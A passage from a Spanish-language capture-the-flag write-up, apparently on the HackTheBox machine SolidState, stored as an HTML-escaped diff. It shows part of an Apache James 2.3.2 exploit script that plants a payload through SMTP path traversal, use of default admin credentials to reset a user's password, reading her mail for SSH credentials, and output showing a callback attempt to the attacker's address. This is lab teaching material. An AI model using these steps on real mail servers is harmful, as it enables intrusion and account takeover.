-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rcpt to: &amp;lt;../../../../../../../../etc/bash_completion.d&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;From: team@team.pl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;quit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Done! Payload will be executed once somebody logs in.&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Connection failed.&quot;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos conectamos al servidor por el puerto 4555 con las credenciales &lt;em&gt;root : root&lt;/em&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.10.10.51 4555
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-JAMES Remote Administration Tool 2.3.2
-Please enter your login and password
-Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
-root
-Password:
-root
-Welcome root. HELP &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a list of commands
-&lt;span class=&quot;nb&quot;&gt;help
-&lt;/span&gt;Currently implemented commands:
-&lt;span class=&quot;nb&quot;&gt;help                                    &lt;/span&gt;display this &lt;span class=&quot;nb&quot;&gt;help
-&lt;/span&gt;listusers                               display existing accounts
-countusers                              display the number of existing accounts
-adduser &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]           add a new user
-verify &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]                       verify &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;specified user exist
-deluser &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]                      delete existing user
-setpassword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;password]       sets a user&lt;span class=&quot;s1&quot;&gt;'s password
-setalias [user] [alias]                 locally forwards all email for '&lt;/span&gt;user&lt;span class=&quot;s1&quot;&gt;' to '&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;alias&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
-showalias [username]                    shows a user'&lt;/span&gt;s current email &lt;span class=&quot;nb&quot;&gt;alias
-&lt;/span&gt;unsetalias &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]                       unsets an &lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'user'&lt;/span&gt;
-setforwarding &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;emailaddress] forwards a user&lt;span class=&quot;s1&quot;&gt;'s email to another email address
-showforwarding [username]               shows a user'&lt;/span&gt;s current email forwarding
-unsetforwarding &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;username]              removes a forward
-user &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;repositoryname]                   change to another user repository
-shutdown                                kills the current JVM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;convenient when James is run as a daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-quit                                    close connection
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;help&lt;/code&gt; vemos que tenemos algunas opciones; vamos a utilizar primero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listusers&lt;/code&gt; para ver los usuarios que se encuentran en el servicio:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;listusers
-Existing accounts 6
-user: james
-user: ../../../../../../../../etc/bash_completion.d
-user: thomas
-user: john
-user: mindy
-user: mailadmin
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../../../../../../../../etc/bash_completion.d&lt;/code&gt; fue el que nos creo el exploit. Ahora vemos que tenemos la posibilidad de cambiar la contraseña de un usuario con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setpassword&lt;/code&gt;; asi que para este caso vamos a tomar al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mindy&lt;/code&gt; y modificaremos la contraseña como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mindy123&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setpassword mindy mindy123
-Password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mindy reset
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora con esto, podemos ingresar al servicio POP3 por el puerto 110 como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mindy&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-+OK solidstate POP3 server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES POP3 Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ready 
-USER mindy
-+OK
-PASS mindy123
-+OK Welcome mindy
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mindy&lt;/code&gt; dentro dle servicio POP3, ahora con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIST&lt;/code&gt; podemos ver los correos del usuario y con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RETR [id]&lt;/code&gt; podemos ver el contenido de los mismos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LIST
-+OK 2 1945
-1 1109
-2 836
-RETR 1                         
-+OK Message follows          
-Return-Path: &amp;lt;mailadmin@localhost&amp;gt;              
-Message-ID: &amp;lt;5420213.0.1503422039826.JavaMail.root@solidstate&amp;gt;                                                                   
-MIME-Version: 1.0                                               
-Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii     
-Content-Transfer-Encoding: 7bit                                 
-Delivered-To: mindy@localhost
-Received: from 192.168.11.142 &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;192.168.11.142]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
-          by solidstate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES SMTP Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP ID 798                                                               
-          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;mindy@localhost&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                
-          Tue, 22 Aug 2017 13:13:42 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 
-Date: Tue, 22 Aug 2017 13:13:42 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                     
-From: mailadmin@localhost                                                                                                        
-Subject: Welcome                                                                                                                 
-
-Dear Mindy,    
-Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critica
-l &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Securit
-y and provide resources that will &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;you make a smooth transition into your new role. The Cyber team is here to support your &lt;span class=&quot;nb&quot;&gt;tr
-&lt;/span&gt;ansition so, please know that you can call on any of us to assist you.                                                           
-
-We are looking forward to you joining our team and your success at Solid State Security. 
-
-Respectfully,
-James
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-RETR 2  
-+OK Message follows
-Return-Path: &amp;lt;mailadmin@localhost&amp;gt;
-Message-ID: &amp;lt;16744123.2.1503422270399.JavaMail.root@solidstate&amp;gt;
-MIME-Version: 1.0
-Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: mindy@localhost
-Received: from 192.168.11.142 &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;192.168.11.142]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-          by solidstate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES SMTP Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP ID 581
-          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;mindy@localhost&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-          Tue, 22 Aug 2017 13:17:28 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Date: Tue, 22 Aug 2017 13:17:28 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-From: mailadmin@localhost
-Subject: Your Access
-
-Dear Mindy,
-
-
-Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
-Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
-
-username: mindy
-pass: P@55W0rd1!2@
-
-Respectfully,
-James
-
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el contenido de los correo, vemos unas credenciales de acceso por el servicio SSH, así que vamos a guardarlas y probarlas:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh mindy@10.10.10.51
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.51 (10.10.10.51)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
-ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '&lt;/span&gt;10.10.10.51&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
-mindy@10.10.10.51'&lt;/span&gt;s password: 
-Linux solidstate 4.9.0-3-686-pae &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686&lt;/span&gt;
-
-The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
-individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;05sr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;36org.apache.james.core.MailImpl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;04x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;17ݬ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;03'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: L: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: attributestLjava/util/HashMap: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: L
-         errorMessagetLjava/lang/String: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: L
-         lastUpdatedtLjava/util/Date: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;04nameq~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02L'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: recipientstLjava/util/Collection: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: L: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'remoteAddrq~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02L'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;05stateq~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02xpsr&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;35org.apache.mailet.MailAddress'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;04m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;07{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;03I&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;03posL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;04hostq~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02L&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;04userq~&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;02xp'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: @team.pl&amp;gt;
-Message-ID: &amp;lt;9152149.0.1635800669443.JavaMail.root@solidstate&amp;gt;
-MIME-Version: 1.0
-Content-Type: text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
-Received: from 10.10.14.23 &lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;10.10.14.23]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-          by solidstate &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JAMES SMTP Server 2.3.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with SMTP ID 285
-          &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &amp;lt;../../../../../../../../etc/bash_completion.d@localhost&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-          Mon, 1 Nov 2021 17:03:49 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Date: Mon, 1 Nov 2021 17:03:49 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-From: team@team.pl
-
-: No such file or directory
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.23] 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : Connection refused
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-mindy@solidstate:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos contramos en una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbash&lt;/code&gt; y nos limita los comandos que podemos ejecutar y podemos comprobarlo si ingresamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mindy&lt;/code&gt; y vemos un directorio de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bin&lt;/code&gt; el cual tiene los binarios que podemos utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 8
-drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 mindy mindy   33 Nov 18  2020 user.txt
-mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; bin/
-total 0
-lrwxrwxrwx 1 root root 8 Aug 22  2017 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; -&amp;gt; /bin/cat
-lrwxrwxrwx 1 root root 8 Aug 22  2017 &lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt; -&amp;gt; /bin/env
-lrwxrwxrwx 1 root root 7 Aug 22  2017 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; -&amp;gt; /bin/ls
-mindy@solidstate:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
